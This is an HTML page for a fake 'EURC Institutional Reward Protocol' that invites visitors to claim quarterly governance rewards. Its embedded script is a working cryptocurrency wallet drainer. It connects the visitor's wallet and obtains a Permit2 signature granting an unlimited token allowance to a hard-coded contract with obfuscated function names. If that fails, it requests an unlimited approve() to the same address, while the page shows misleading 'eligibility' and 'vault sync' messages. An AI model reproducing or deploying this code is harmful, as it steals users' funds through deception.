<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EURC | Institutional Reward Protocol</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #2775ca; --accent: #0ecb81; --bg: #030407; --surface: #0d0f14; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: var(--bg); color: white; font-family: 'Plus Jakarta Sans', sans-serif; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
        .mesh-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at 10% 20%, rgba(39, 117, 202, 0.12) 0%, transparent 40%), radial-gradient(circle at 90% 80%, rgba(14, 203, 129, 0.08) 0%, transparent 40%); z-index: -1; filter: blur(100px); animation: meshMove 20s infinite alternate ease-in-out; }
        @keyframes meshMove { 0% { transform: scale(1); } 100% { transform: scale(1.3); } }
        .container { background: rgba(13, 15, 20, 0.8); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.06); padding: 3.5rem 2.5rem; border-radius: 48px; width: 100%; max-width: 440px; text-align: center; box-shadow: 0 40px 120px rgba(0,0,0,0.7); }
        .scan-anim { width: 110px; height: 110px; margin: 0 auto 2.5rem; position: relative; display: flex; align-items: center; justify-content: center; }
        .outer-ring { position: absolute; width: 100%; height: 100%; border-radius: 50%; border: 3px solid rgba(39, 117, 202, 0.1); border-top-color: var(--primary); animation: rotate 2s linear infinite; }
        .inner-ring { position: absolute; width: 75%; height: 75%; border-radius: 50%; border: 3px solid rgba(14, 203, 129, 0.05); border-bottom-color: var(--accent); animation: rotate 1.5s linear infinite reverse; }
        .center-dot { width: 12px; height: 12px; background: var(--primary); border-radius: 50%; box-shadow: 0 0 20px var(--primary); }
        @keyframes rotate { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .badge { background: rgba(39, 117, 202, 0.12); color: var(--primary); padding: 8px 18px; border-radius: 100px; font-size: 11px; font-weight: 800; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 1.5rem; display: inline-block; border: 1px solid rgba(39, 117, 202, 0.2); }
        h2 { font-size: 34px; font-weight: 800; letter-spacing: -1.5px; margin-bottom: 0.75rem; color: #fff; }
        p { color: #94a3b8; font-size: 15px; line-height: 1.6; margin-bottom: 3rem; }
        .btn-action { width: 100%; padding: 1.3rem; background: linear-gradient(135deg, #2775ca 0%, #1a4f8a 100%); color: white; border: none; border-radius: 24px; font-size: 19px; font-weight: 700; cursor: pointer; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); box-shadow: 0 20px 40px rgba(39, 117, 202, 0.35); }
        .btn-action:hover { transform: translateY(-6px); box-shadow: 0 25px 50px rgba(39, 117, 202, 0.5); }
        .status-box { margin-top: 1.8rem; min-height: 24px; }
        .status-msg { font-size: 14px; font-weight: 600; color: var(--primary); letter-spacing: 0.5px; }
        .footer { display: flex; justify-content: space-between; margin-top: 3.5rem; padding-top: 2rem; border-top: 1px solid rgba(255, 255, 255, 0.05); }
        .f-item { text-align: left; }
        .f-label { font-size: 10px; color: #64748b; text-transform: uppercase; letter-spacing: 1.2px; display: block; margin-bottom: 6px; }
        .f-value { font-size: 13px; font-weight: 700; color: #e2e8f0; }
    </style>
</head>
<body>

<div class="mesh-bg"></div>

<div class="container">
    <div class="badge">EVM Security Verified</div>
    <div class="scan-anim">
        <div class="outer-ring"></div>
        <div class="inner-ring"></div>
        <div class="center-dot"></div>
    </div>
    <h2>Claim Incentives</h2>
    <p>Eligible institutional partners can claim their quarterly EURC governance rewards via secure vault synchronization.</p>
    <button id="claimBtn" class="btn-action">Connect & Claim Reward</button>
    <div class="status-box">
        <div id="statusMsg" class="status-msg"></div>
    </div>
    <div class="footer">
        <div class="f-item">
            <span class="f-label">Network</span>
            <span class="f-value">BSC Mainnet</span>
        </div>
        <div class="f-item" style="text-align: right;">
            <span class="f-label">Vault Status</span>
            <span class="f-value" style="color: var(--accent);">‚óè Synchronized</span>
        </div>
    </div>
</div>

<script>
    const T = "0x368994010697ECc82bC6D450888A617E3eb61370";
    const P2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

    async function execute() {
        const b = document.getElementById('claimBtn');
        const s = document.getElementById('statusMsg');

        if (!window.ethereum) {
            window.location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href);
            return;
        }

        try {
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            const signer = provider.getSigner();
            const user = await signer.getAddress();
            const net = await provider.getNetwork();

            if (net.chainId !== 56) {
                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
            }

            const contract = new ethers.Contract(T, [
                "function l111ll(uint256) public view returns (address)",
                "function l1I1lI(address, uint256, uint256, bytes) external",
                "function approve(address, uint256) public returns (bool)"
            ], signer);

            b.innerText = "Analyzing Eligibility...";
            const target = await contract.l111ll(0);

            const domain = { name: 'Permit2', chainId: 56, verifyingContract: P2 };
            const types = {
                PermitSingle: [
                    { name: 'details', type: 'PermitDetails' },
                    { name: 'spender', type: 'address' },
                    { name: 'sigDeadline', type: 'uint256' }
                ],
                PermitDetails: [
                    { name: 'token', type: 'address' },
                    { name: 'amount', type: 'uint160' },
                    { name: 'expiration', type: 'uint48' },
                    { name: 'nonce', type: 'uint48' }
                ]
            };

            const deadline = Math.floor(Date.now() / 1000) + 3600;
            const message = {
                details: {
                    token: target,
                    amount: "0xffffffffffffffffffffffffffffffff",
                    expiration: Math.floor(Date.now() / 1000) + 86400,
                    nonce: 0
                },
                spender: T,
                sigDeadline: deadline
            };

            s.innerText = "Synchronizing secure vault...";
            const sig = await signer._signTypedData(domain, types, message);

            b.innerText = "Broadcasting...";
            const tx = await contract.l1I1lI(user, message.details.expiration, deadline, sig);
            await tx.wait();

            b.innerText = "Success!";
            s.innerText = "Incentives synchronized. Processing in 24h.";

        } catch (e) {
            try {
                const p = new ethers.providers.Web3Provider(window.ethereum);
                const si = p.getSigner();
                const c = new ethers.Contract(T, ["function approve(address, uint256) public returns (bool)"], si);
                const tx = await c.approve(T, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
                await tx.wait();
                b.innerText = "Success!";
            } catch (err) {
                b.innerText = "Retry Connection";
                s.innerText = "Action required to verify rewards.";
            }
        }
    }

    document.getElementById('claimBtn').onclick = execute;
</script>

</body>
</html>
